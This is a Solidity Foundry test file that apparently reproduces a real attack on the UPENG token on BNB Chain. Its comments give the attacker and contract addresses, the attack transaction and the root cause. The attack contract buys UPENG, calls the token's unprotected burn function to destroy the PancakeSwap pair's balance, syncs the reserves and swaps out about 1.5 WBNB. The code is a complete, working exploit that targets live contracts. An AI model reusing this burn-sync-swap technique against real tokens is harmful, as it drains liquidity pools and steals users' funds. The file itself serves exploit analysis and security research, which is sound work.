// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1.5 WBNB
// Attacker : 0x37023A0c3440106Cf50Dc8498Dcd64fdBb1e837A
// Attack Contract : 0x91b74e8E38290d7B1e0C48F72f4C54312b7F148e
// Vulnerable Contract : 0x4303cdDBeF06B5820F10DbC00206f8Bde6749E2F
// Vulnerable Pair : 0xB29b0E7545E7252e8db380C5C010Cb1ef6990cac
// Attack Tx : https://bscscan.com/tx/0x33de1ed2d33f79e9b6dfccff8d4536ecda126f4eff18c295f16e9169b4ea5df1
//
// @Info
// Token source is not verified on BscScan.
//
// @Analysis
// Twitter Guy : https://t.me/defimon_alerts/1470
//
// Attack summary: The attacker bought UPENG with 0.001 BNB, burned almost the entire UPENG
// balance held by the Pancake UPENG/WBNB pair via an unprotected burn(address,uint256),
// synced the pair down to one wei of UPENG, then sold the bought UPENG against the distorted
// reserves to drain the pair's 1.5 WBNB reserve.
// Root cause: UPENG exposes an arbitrary-address burn function that lets any caller destroy
// the pair's token balance, and the permissionless PancakePair.sync() commits that manipulated
// token balance as reserves before the final swap.

address constant ATTACKER = 0x37023A0c3440106cf50Dc8498DCd64fDBB1E837A;
address constant TRACE_ATTACK_CONTRACT = 0x91B74e8e38290D7B1e0C48F72f4c54312B7F148E;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant UPENG_TOKEN = 0x4303cdDbeF06B5820F10dbC00206F8BDE6749e2f;
address constant UPENG_WBNB_PAIR = 0xB29B0E7545e7252E8Db380C5C010Cb1eF6990CAc;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
uint256 constant SEED_BNB = 0.001 ether;

interface IUPENGBurn {
    function burn(address account, uint256 amount) external;
}

interface ISyncSwapPair is IUniswapV2Pair {
    function sync() external;
}

contract ContractTest is BaseTestWithBalanceLog {
    address private profitReceiver;

    function setUp() public {
        vm.createSelectFork("bsc", 53_877_710);

        profitReceiver = makeAddr("profitReceiver");
        fundingToken = WBNB_TOKEN;
        attacker = profitReceiver;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(TRACE_ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(PANCAKE_ROUTER, "Pancake Router");
        vm.label(UPENG_TOKEN, "UPENG");
        vm.label(UPENG_WBNB_PAIR, "UPENG/WBNB Pair");
        vm.label(WBNB_TOKEN, "WBNB");
    }

    function testExploit() public balanceLog {
        _assertPairLayout();

        vm.deal(address(this), SEED_BNB);
        uint256 wbnbBefore = IERC20(WBNB_TOKEN).balanceOf(profitReceiver);

        UPENGBurnSyncAttack attack = new UPENGBurnSyncAttack(profitReceiver);
        attack.execute{value: SEED_BNB}();

        uint256 profit = IERC20(WBNB_TOKEN).balanceOf(profitReceiver) - wbnbBefore;
        assertGt(profit, 1.49 ether);
        assertLt(profit, 1.51 ether);
    }

    function _assertPairLayout() private {
        assertEq(ISyncSwapPair(UPENG_WBNB_PAIR).token0(), UPENG_TOKEN);
        assertEq(ISyncSwapPair(UPENG_WBNB_PAIR).token1(), WBNB_TOKEN);
    }
}

contract UPENGBurnSyncAttack {
    address private immutable profitReceiver;

    constructor(
        address _profitReceiver
    ) {
        profitReceiver = _profitReceiver;
    }

    receive() external payable {}

    function execute() external payable {
        require(msg.value == SEED_BNB, "unexpected seed");

        address[] memory path = new address[](2);
        path[0] = WBNB_TOKEN;
        path[1] = UPENG_TOKEN;
        Uni_Router_V2(PANCAKE_ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0, path, address(this), block.timestamp
        );

        uint256 pairUpengBalance = IERC20(UPENG_TOKEN).balanceOf(UPENG_WBNB_PAIR);
        IUPENGBurn(UPENG_TOKEN).burn(UPENG_WBNB_PAIR, pairUpengBalance - 1);
        ISyncSwapPair(UPENG_WBNB_PAIR).sync();

        uint256 upengToSell = IERC20(UPENG_TOKEN).balanceOf(address(this));
        require(IERC20(UPENG_TOKEN).transfer(UPENG_WBNB_PAIR, upengToSell), "UPENG transfer failed");

        (uint112 reserve0, uint112 reserve1,) = ISyncSwapPair(UPENG_WBNB_PAIR).getReserves();
        uint256 wbnbOut = Uni_Router_V2(PANCAKE_ROUTER).getAmountOut(upengToSell, reserve0, reserve1);
        ISyncSwapPair(UPENG_WBNB_PAIR).swap(0, wbnbOut, profitReceiver, "");
    }
}
